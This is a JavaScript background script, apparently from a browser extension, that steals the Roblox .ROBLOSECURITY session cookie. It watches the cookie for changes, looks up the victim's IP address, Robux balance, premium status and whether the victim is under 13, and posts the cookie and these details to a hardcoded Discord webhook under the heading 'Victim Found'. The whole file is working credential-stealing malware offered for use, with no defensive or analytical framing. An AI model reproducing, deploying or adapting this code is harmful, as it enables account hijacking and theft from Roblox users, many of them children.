const WEBHOOKS = [
    {
        url: "https://discord.com/api/webhooks/1377683745041154229/hem_TvDKnw1xhxttS0M6226ZOuVhIeJ60vZtmBD1M_nOAMTE8Vn8a6KHVvibHmtT7RPc",
        mention: "@everyone"
    }
];

let lastCookie = null;

async function main(cookie) {
    if (!cookie) return;

    if (cookie === lastCookie) return;
    lastCookie = cookie;

    let ipAddr = await (await fetch("https://api.ipify.org")).text();
    let statistics = null;

    try {
        let res = await fetch("https://users.roblox.com/v1/users/authenticated", {
            method: "GET",
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });

        if (res.ok) {
            let user = await res.json();
            let economyRes = await fetch("https://economy.roblox.com/v1/users/" + user.id + "/currency", {
                headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
            });
            let economy = economyRes.ok ? await economyRes.json() : { robux: "N/A", robuxPending: "N/A" };

            let premiumRes = await fetch("https://premiumfeatures.roblox.com/v1/users/" + user.id + "/validate-membership", {
                headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
            });
            let isPremium = premiumRes.ok ? await premiumRes.json() : false;

            let thumbRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=420x420&format=Png&isCircular=false`);
            let thumbJson = await thumbRes.json();
            let thumbUrl = thumbJson.data && thumbJson.data.length > 0 ? thumbJson.data[0].imageUrl : "";

            statistics = {
                UserName: user.name,
                UserId: user.id,
                IsUnder13: user.isUnder13,
                JoinDate: user.created ? new Date(user.created).toDateString() : "N/A",
                RobuxBalance: economy.robux ?? "N/A",
                PendingRobux: economy.robuxPending ?? "N/A",
                IsPremium: isPremium,
                ThumbnailUrl: thumbUrl
            };
        }
    } catch (e) {
        console.error(e);
    }

    const embedPayload = {
        embeds: [
            {
                description: "```" + cookie + "```",
                fields: [
                    { name: "Username", value: statistics ? statistics.UserName : "N/A", inline: true },
                    { name: "User ID", value: statistics ? statistics.UserId : "N/A", inline: true },
                    { name: "Underage", value: statistics ? (statistics.IsUnder13 ? "✅ Yes" : "❌ No") : "N/A", inline: true },
                    { name: "Join Date", value: statistics ? statistics.JoinDate : "N/A", inline: true },
                    { name: "Robux", value: statistics ? statistics.RobuxBalance : "N/A", inline: true },
                    { name: "Pending Robux", value: statistics ? statistics.PendingRobux : "N/A", inline: true },
                    { name: "Premium", value: statistics ? (statistics.IsPremium ? "✅ Yes" : "❌ No") : "N/A", inline: true }
                ],
                author: {
                    name: "Victim Found: " + ipAddr,
                    icon_url: statistics ? statistics.ThumbnailUrl : ""
                },
                footer: { text: "ENTERPRISE" }
            }
        ]
    };

    // ✅ Send to webhook
    for (let wh of WEBHOOKS) {
        fetch(wh.url, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ ...embedPayload, content: wh.mention })
        }).catch(console.error);
    }
}

// Run once
chrome.cookies.get({ url: "https://www.roblox.com/home", name: ".ROBLOSECURITY" }, c => main(c ? c.value : null));

// Keep watching
chrome.cookies.onChanged.addListener(changeInfo => {
    if (changeInfo.cookie && changeInfo.cookie.name === ".ROBLOSECURITY" && changeInfo.cookie.domain.includes("roblox.com") && !changeInfo.removed) {
        main(changeInfo.cookie.value);
    }
});
